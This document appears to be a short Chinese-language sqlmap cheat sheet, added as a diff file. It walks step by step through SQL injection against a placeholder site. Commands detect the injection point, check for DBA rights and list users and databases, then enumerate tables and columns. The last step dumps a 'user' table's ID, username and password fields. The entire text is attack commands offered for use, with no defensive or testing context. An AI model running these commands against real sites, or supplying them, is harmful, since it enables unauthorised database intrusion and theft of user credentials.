@@ -1,0 +1,69 @@
+
+
+                                           作者：拿破飞机
+---------------------------------------------------------------------------------------------
+
+sqlmap.py -u http://www.xx.com/show.php?id=81 --当前用户权限
+
+例：
+sqlmap.py -u "http://www.xx.com/show.php?id=81" --is-dba
+
+
+sqlmap.py -u http://www.xx.com/show.php?id=81 --所有数据库用户
+
+例：
+sqlmap.py -u "http://www.xx.com/show.php?id=81" --users
+
+
+sqlmap.py -u http://www.xx.com/show.php?id=81 --当前数据库用户
+
+例：
+sqlmap.py -u "http://www.xx.com/show.php?id=81" --current-user
+
+
+1.检测注入点，判断数据库类型及服务器等类型
+
+sqlmap.py -u http://www.xx.com/show.php?id=81
+
+例：
+sqlmap.py -u "http://www.xx.com/show.php?id=81"
+
+
+2.获取所有数据库
+
+sqlmap.py -u http://www.xx.com/show.php?id=81 --获取所有数据库
+
+例：
+sqlmap.py -u "http://www.xx.com/show.php?id=81" --dbs
+
+
+3.获取网站当前数据库
+
+sqlmap.py -u http://www.xx.com/show.php?id=81 --获取网站当前数据库
+
+例：
+sqlmap.py -u "http://www.xx.com/show.php?id=81" --current-db
+
+
+4.获取数据库中的表
+
+sqlmap.py -u http://www.xx.com/show.php?id=81 -D 指定一个数据库 --tables
+
+例：
+sqlmap.py -u "http://www.xx.com/show.php?id=81" -D zsb --tables
+
+
+5.获取数据表中的字段
+
+sqlmap.py -u http://www.xx.com/show.php?id=81 -D 数据库 -T 数据表 --columns 
+
+例：
+sqlmap.py -u "http://www.xx.com/show.php?id=81" -D zsb -T user --columns
+
+
+6.获取字段中的内容
+
+sqlmap.py -u http://www.xx.com/show.php?id=81 -D 数据库 -T 数据表 -C 字段名1,字段名2,字段名3... --dump
+
+例：
+sqlmap.py -u "http://www.xx.com/show.php?id=81" -D zsb -T user -C "u_id,u_name,u_pass" --dump
